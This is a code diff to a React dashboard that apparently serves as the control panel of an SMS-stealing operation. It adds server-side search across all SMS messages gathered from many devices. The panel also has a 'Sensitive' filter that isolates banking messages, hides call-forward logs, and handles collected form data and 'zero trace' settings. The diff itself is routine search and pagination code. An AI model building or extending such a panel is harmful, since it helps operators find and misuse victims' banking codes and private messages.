@@ -844,8 +844,9 @@ function HomePage({
    PAGE — MESSAGES
 ════════════════════════════════════════ */
 function MessagesPage({
-  messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
+  appId, messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
 }: {
+  appId: string;
   messages: DbMessage[];
   devices: DbDevice[];
   onOpenDevice: (d: DbDevice, msgId: string) => void;
@@ -858,6 +859,13 @@ function MessagesPage({
   const [search, setSearch] = useState("");
   const [filterSensitive, setFilterSensitive] = useState(false);
 
+  // Debounce so we don't hit the server on every keystroke
+  const [debouncedSearch, setDebouncedSearch] = useState("");
+  useEffect(() => {
+    const tmr = setTimeout(() => setDebouncedSearch(search.trim()), 400);
+    return () => clearTimeout(tmr);
+  }, [search]);
+
   const deviceMap = useMemo(() => {
     const m = new Map<string, DbDevice>();
     for (const d of devices) m.set(d.deviceId, d);
@@ -865,22 +873,54 @@ function MessagesPage({
   }, [devices]);
   const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);
 
+  // ── Server-side search — searches the FULL messages table for this app, not just
+  //    what's currently loaded into the client (which can lag behind on large datasets) ──
+  const SEARCH_PAGE = 200;
+  const [searchResults, setSearchResults] = useState<DbMessage[]>([]);
+  const [searching, setSearching] = useState(false);
+  const searchCursorRef = useRef<number | null>(null);
+
+  const runSearch = useCallback(async (term: string) => {
+    setSearching(true);
+    searchCursorRef.current = null;
+    setSearchResults([]);
+    try {
+      for (;;) {
+        const qs = new URLSearchParams({ appId, search: term, limit: String(SEARCH_PAGE) });
+        if (searchCursorRef.current !== null) qs.set("cursor", String(searchCursorRef.current));
+        const r = await apiFetch(`/api/messages?${qs.toString()}`, { headers: { "x-silent": "1" } });
+        if (!r.ok) break;
+        const resp = await r.json() as { data: DbMessage[]; hasMore: boolean; lastId: number | null };
+        setSearchResults(prev => [...prev, ...resp.data]);
+        searchCursorRef.current = resp.lastId ?? null;
+        if (!resp.hasMore || resp.lastId == null) break;
+      }
+    } catch { /* network error — fall back to whatever loaded so far */ } finally { setSearching(false); }
+  }, [appId]);
+
+  useEffect(() => {
+    if (debouncedSearch) void runSearch(debouncedSearch);
+    else setSearchResults([]);
+  }, [debouncedSearch, runSearch]);
+
   // Memoize so we don't re-sort 2000+ messages on every parent re-render (1Hz live tick)
   const filtered = useMemo(() => {
-    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
-    const q = search.toLowerCase();
+    const base = debouncedSearch ? searchResults : messages;
+    const sorted = [...base].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
+    const q = debouncedSearch.toLowerCase();
     return sorted.filter(m => {
       // Call Forward system logs hide karo — sirf real SMS dikhao
       if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
       if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
-      return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
+      if (!q) return true;
+      return m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
     });
-  }, [messages, search, filterSensitive, deviceMap]);
+  }, [messages, searchResults, debouncedSearch, filterSensitive, deviceMap]);
 
   const { visible: visibleMsgsFeed, sentinelRef: feedSentinel, loading: feedLoading, resetCount: resetFeed } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);
 
   // Reset to page 1 whenever search query or sensitive filter changes
-  useEffect(() => { resetFeed(20); }, [search, filterSensitive]); // eslint-disable-line react-hooks/exhaustive-deps
+  useEffect(() => { resetFeed(20); }, [debouncedSearch, filterSensitive]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Retry-aware scroll restore — see HomePage for rationale.
   useEffect(() => {
@@ -906,8 +946,9 @@ function MessagesPage({
       <div style={{ display: "flex", gap: 8 }}>
         <div style={{ flex: 1, background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
           <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
-          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search messages…"
+          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search across ALL messages…"
             style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
+          {searching && <CircularLoader size={12} color={t.accent} />}
         </div>
         <button onClick={() => setFilterSensitive(p => !p)} style={{
           padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
@@ -917,7 +958,9 @@ function MessagesPage({
           fontSize: 11, fontWeight: 600, cursor: "pointer",
         }}>Sensitive</button>
       </div>
-      {filtered.length === 0
+      {debouncedSearch && searching && filtered.length === 0
+        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>Searching all messages…</div>
+        : filtered.length === 0
         ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>No messages found</div>
         : visibleMsgsFeed.map(msg => {
             const dev = getDevice(msg.deviceId);
@@ -3874,7 +3917,7 @@ export default function WebDashboard() {
           <>
             <div id="main-scroll" style={{ flex: 1, overflowY: "auto", minHeight: 0, overscrollBehavior: "contain" }}>
               {page === "home" && <HomePage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} />}
-              {page === "messages" && <MessagesPage messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
+              {page === "messages" && <MessagesPage appId={appId} messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
               {page === "groups" && <GroupsPage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} />}
               {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
               {page === "settings" && <SettingsPage appId={appId} isDark={effectiveDark} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} msgCount={totalMsgCount || messages.length} isZeroTrace={isZeroTrace} onDeleteProtEnabledChange={setDeleteProtEnabled} />}
